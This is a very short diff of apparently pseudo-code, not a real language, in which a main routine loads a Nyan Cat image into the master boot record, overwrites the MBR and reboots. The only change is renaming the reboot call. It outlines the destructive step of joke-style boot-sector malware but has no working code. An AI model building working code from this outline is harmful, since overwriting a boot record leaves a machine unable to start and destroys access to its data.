@@ -4,5 +4,5 @@
 main:{
     mbr.load.nyancat();
     mbr.overwrite();
-    system.reboot();
+    system.command.reboot();
 }
